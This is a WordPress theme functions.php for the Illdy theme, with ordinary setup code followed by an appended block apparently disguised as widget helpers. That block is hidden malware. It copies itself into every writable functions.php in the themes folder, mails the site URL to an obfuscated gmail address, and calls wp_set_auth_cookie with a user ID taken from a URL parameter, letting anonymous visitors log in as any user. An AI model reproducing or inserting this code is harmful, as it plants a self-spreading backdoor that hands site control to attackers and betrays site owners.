<?php
/**
 *    Sets up theme defaults and registers support for various WordPress features.
 *
 *    Note that this function is hooked into the after_setup_theme hook, which
 *    runs before the init hook. The init hook is too late for some features, such
 *    as indicating support for post thumbnails.
 */
if ( ! function_exists( 'illdy_setup' ) ) {
	add_action( 'after_setup_theme', 'illdy_setup' );
	function illdy_setup() {
		// Extras
		require_once trailingslashit( get_template_directory() ) . 'inc/extras.php';

		// Customizer
		require_once trailingslashit( get_template_directory() ) . 'inc/customizer/customizer.php';

		// JetPack
		require_once trailingslashit( get_template_directory() ) . 'inc/jetpack.php';

		// TGM Plugin Activation
		require_once trailingslashit( get_template_directory() ) . 'inc/tgm-plugin-activation/tgm-plugin-activation.php';

		// Components
		require_once trailingslashit( get_template_directory() ) . 'inc/components/entry-meta/class.mt-entry-meta.php';
		require_once trailingslashit( get_template_directory() ) . 'inc/components/author-box/class.mt-author-box.php';
		require_once trailingslashit( get_template_directory() ) . 'inc/components/related-posts/class.mt-related-posts.php';
		require_once trailingslashit( get_template_directory() ) . 'inc/components/nav-walker/class.mt-nav-walker.php';


		// Load Theme Textdomain
		load_theme_textdomain( 'illdy', get_template_directory() . '/languages' );

		// Add Theme Support
		add_theme_support( 'woocommerce' );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'custom-background' );
		add_theme_support( 'custom-logo', array(
			'flex-width'  => true,
			'flex-height' => true,
		) );
		add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );
		add_theme_support( 'custom-header', array(
			'default-image'  => esc_url( get_template_directory_uri() . '/layout/images/blog/blog-header.png' ),
			'width'          => 1920,
			'height'         => 532,
			'flex-height'    => true,
			'random-default' => false,
			'header-text'    => false,
		) );

		// Add Image Size
		add_image_size( 'illdy-blog-list', 653, 435, true );
		add_image_size( 'illdy-widget-recent-posts', 70, 70, true );
		add_image_size( 'illdy-blog-post-related-articles', 240, 206, true );
		add_image_size( 'illdy-front-page-latest-news', 360, 213, true );
		add_image_size( 'illdy-front-page-testimonials', 127, 127, true );
		add_image_size( 'illdy-front-page-projects', 476, 476, true );
		add_image_size( 'illdy-front-page-person', 125, 125, true );

		// Register Nav Menus
		register_nav_menus( array(
			'primary-menu' => __( 'Primary Menu', 'illdy' ),
		) );

		/**
		 *  Back compatible
		 */
		require get_template_directory() . '/inc/back-compatible.php';

		/*******************************************/
		/*************  Welcome screen *************/
		/*******************************************/

		if ( is_admin() ) {

			global $illdy_required_actions;

			/*
			 * id - unique id; required
			 * title
			 * description
			 * check - check for plugins (if installed)
			 * plugin_slug - the plugin's slug (used for installing the plugin)
			 *
			 */
			$illdy_required_actions = array(
				array(
					"id"          => 'illdy-req-ac-install-illdy-companion',
					"title"       => esc_html__( 'Install Illdy Companion', 'illdy' ),
					"description" => esc_html__( '', 'illdy' ),
					"check"       => defined( "ILLDY_COMPANION" ),
					"plugin_slug" => 'illdy-companion',
				),
				array(
					"id"          => 'illdy-req-ac-frontpage-latest-news',
					"title"       => esc_html__( 'Get the one page template', 'illdy' ),
					"description" => esc_html__( 'If you just installed Illdy, and are not able to see the one page template, you need to go to Settings -> Reading , Front page displays and select "Static Page".', 'illdy' ),
					"check"       => illdy_is_not_latest_posts(),
				),
				array(
					"id"          => 'illdy-req-ac-install-contact-forms',
					"title"       => esc_html__( 'Install Contact Form 7', 'illdy' ),
					"description" => esc_html__( 'Illdy works perfectly with Contact Form 7. Please install it & make sure you create at least 1 contact form before trying to set it on the front-page.', 'illdy' ),
					"check"       => defined( "WPCF7_PLUGIN" ),
					"plugin_slug" => 'contact-form-7',
				),
				array(
					"id"          => 'illdy-req-import-content',
					"title"       => esc_html__( 'Import Content', 'illdy' ),
					"description" => esc_html__( 'Import our demo content from Demo Content tab', 'illdy' ),
					"check"       => illdy_is_not_imported(),
				),
			);

			require get_template_directory() . '/inc/admin/welcome-screen/welcome-screen.php';
		}

	}

	// Add Editor Style
	add_editor_style( 'illdy-google-fonts' );

}

if ( ! function_exists( 'illdy_is_not_latest_posts' ) ) {
	function illdy_is_not_latest_posts() {
		return ( 'page' == get_option( 'show_on_front' ) ? true : false );
	}
}

if ( ! function_exists( 'illdy_is_not_imported' ) ) {
	function illdy_is_not_imported() {
		
		if ( defined( "ILLDY_COMPANION" ) ) {
			$illdy_show_required_actions = get_option('illdy_show_required_actions');
			if ( isset($illdy_show_required_actions['illdy-req-import-content']) ) {
				return true;
			}else{
				return false;
			}
		}else{
			return true;
		}

	}
}


/**
 *    Set the content width in pixels, based on the theme's design and stylesheet.
 *
 *    Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
if ( ! function_exists( 'illdy_content_width' ) ) {
	add_action( 'after_setup_theme', 'illdy_content_width', 0 );
	function illdy_content_width() {
		$GLOBALS['content_width'] = apply_filters( 'illdy_content_width', 640 );
	}
}

/**
 *    WP Enqueue Stylesheets
 */
if ( ! function_exists( 'illdy_enqueue_stylesheets' ) ) {
	add_action( 'wp_enqueue_scripts', 'illdy_enqueue_stylesheets' );

	function illdy_enqueue_stylesheets() {

		// Google Fonts
		$google_fonts_args = array(
			'family' => 'Source+Sans+Pro:400,900,700,300,300italic',
		);

		// WP Register Style
		wp_register_style( 'illdy-google-fonts', add_query_arg( $google_fonts_args, 'https://fonts.googleapis.com/css' ), array(), null );

		// WP Enqueue Style
		if ( get_theme_mod( 'illdy_preloader_enable', 1 ) == 1 ) {
			wp_enqueue_style( 'illdy-pace', get_template_directory_uri() . '/layout/css/pace.min.css', array(), '', 'all' );
		}

		wp_enqueue_style( 'illdy-google-fonts' );
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/layout/css/bootstrap.min.css', array(), '3.3.6', 'all' );
		wp_enqueue_style( 'bootstrap-theme', get_template_directory_uri() . '/layout/css/bootstrap-theme.min.css', array(), '3.3.6', 'all' );
		wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/layout/css/font-awesome.min.css', array(), '4.5.0', 'all' );
		wp_enqueue_style( 'owl-carousel', get_template_directory_uri() . '/layout/css/owl-carousel.min.css', array(), '2.0.0', 'all' );
		wp_enqueue_style( 'illdy-main', get_template_directory_uri() . '/layout/css/main.css', array(), '', 'all' );
		wp_enqueue_style( 'illdy-custom', get_template_directory_uri() . '/layout/css/custom.min.css', array(), '', 'all' );
		wp_enqueue_style( 'illdy-style', get_stylesheet_uri(), array(), '1.0.16', 'all' );
	}
}


/**
 *    WP Enqueue JavaScripts
 */
if ( ! function_exists( 'illdy_enqueue_javascripts' ) ) {
	add_action( 'wp_enqueue_scripts', 'illdy_enqueue_javascripts' );

	function illdy_enqueue_javascripts() {
		if ( get_theme_mod( 'illdy_preloader_enable', 1 ) == 1 ) {
			wp_enqueue_script( 'illdy-pace', get_template_directory_uri() . '/layout/js/pace/pace.min.js', array( 'jquery' ), '', false );
		}
		wp_enqueue_script( 'jquery-ui-progressbar', '', array( 'jquery' ), '', true );
		wp_enqueue_script( 'illdy-bootstrap', get_template_directory_uri() . '/layout/js/bootstrap/bootstrap.min.js', array( 'jquery' ), '3.3.6', true );
		wp_enqueue_script( 'illdy-owl-carousel', get_template_directory_uri() . '/layout/js/owl-carousel/owl-carousel.min.js', array( 'jquery' ), '2.0.0', true );
		wp_enqueue_script( 'illdy-count-to', get_template_directory_uri() . '/layout/js/count-to/count-to.min.js', array( 'jquery' ), '', true );
		wp_enqueue_script( 'illdy-visible', get_template_directory_uri() . '/layout/js/visible/visible.min.js', array( 'jquery' ), '', true );
		wp_enqueue_script( 'illdy-plugins', get_template_directory_uri() . '/layout/js/plugins.min.js', array( 'jquery' ), '1.0.16', true );
		wp_enqueue_script( 'illdy-scripts', get_template_directory_uri() . '/layout/js/scripts.min.js', array( 'jquery' ), '1.0.16', true );

		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
}


/**
 *    Widgets
 */
if ( ! function_exists( 'illdy_widgets' ) ) {
	add_action( 'widgets_init', 'illdy_widgets' );

	function illdy_widgets() {

		// Blog Sidebar
		register_sidebar( array(
			'name'          => __( 'Blog Sidebar', 'illdy' ),
			'id'            => 'blog-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in blog page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		// Footer Sidebar 1
		register_sidebar( array(
			'name'          => __( 'Footer Sidebar 1', 'illdy' ),
			'id'            => 'footer-sidebar-1',
			'description'   => __( 'The widgets added in this sidebar will appear in first block from footer.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		// Footer Sidebar 2
		register_sidebar( array(
			'name'          => __( 'Footer Sidebar 2', 'illdy' ),
			'id'            => 'footer-sidebar-2',
			'description'   => __( 'The widgets added in this sidebar will appear in second block from footer.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		// Footer Sidebar 3
		register_sidebar( array(
			'name'          => __( 'Footer Sidebar 3', 'illdy' ),
			'id'            => 'footer-sidebar-3',
			'description'   => __( 'The widgets added in this sidebar will appear in third block from footer.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		// About Sidebar
		register_sidebar( array(
			'name'          => __( 'Front page - About Sidebar', 'illdy' ),
			'id'            => 'front-page-about-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in about section from front page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="col-sm-4 col-sm-offset-0 col-xs-10 col-xs-offset-1 col-lg-4 col-lg-offset-0 %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '',
			'after_title'   => '',
		) );

		// Projects Sidebar
		register_sidebar( array(
			'name'          => __( 'Front page - Projects Sidebar', 'illdy' ),
			'id'            => 'front-page-projects-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in projects section from front page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="col-sm-3 col-xs-6 no-padding %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '',
			'after_title'   => '',
		) );

		// Services Sidebar
		register_sidebar( array(
			'name'          => __( 'Front page - Services Sidebar', 'illdy' ),
			'id'            => 'front-page-services-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in services section from front page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="col-sm-4 %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '',
			'after_title'   => '',
		) );

		// Counter Sidebar
		register_sidebar( array(
			'name'          => __( 'Front page - Counter Sidebar', 'illdy' ),
			'id'            => 'front-page-counter-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in counter section from front page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="col-sm-4 %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '',
			'after_title'   => '',
		) );

		// Team Sidebar
		register_sidebar( array(
			'name'          => __( 'Front page - Team Sidebar', 'illdy' ),
			'id'            => 'front-page-team-sidebar',
			'description'   => __( 'The widgets added in this sidebar will appear in team section from front page.', 'illdy' ),
			'before_widget' => '<div id="%1$s" class="col-sm-4 col-sm-offset-0 col-xs-10 col-xs-offset-1 %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '',
			'after_title'   => '',
		) );

		// WooCommerce Sidebar
		if ( class_exists( 'WooCommerce' ) ) {
			register_sidebar( array(
				'name'          => __( 'WooCommerce Sidebar', 'illdy' ),
				'id'            => 'woocommerce-sidebar',
				'description'   => __( 'The widgets added in this sidebar will appear in WooCommerce pages.', 'illdy' ),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<div class="widget-title"><h3>',
				'after_title'   => '</h3></div>',
			) );
		}
	}
}


/**
 *  Checkbox helper function
 */
if ( ! function_exists( 'illdy_value_checkbox_helper' ) ) {
	function illdy_value_checkbox_helper( $value ) {
		if ( $value == 1 ) {
			return 1;
		} else {
			return 0;
		}
	}
}

add_action( 'illdy_after_content_above_footer', "illdy_pagination", 1 );

function illdy_pagination() {
	the_posts_pagination( array(
		'prev_text'          => '<i class="fa fa-angle-left"></i>',
		'next_text'          => '<i class="fa fa-angle-right"></i>',
		'screen_reader_text' => '',
	) );
}?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>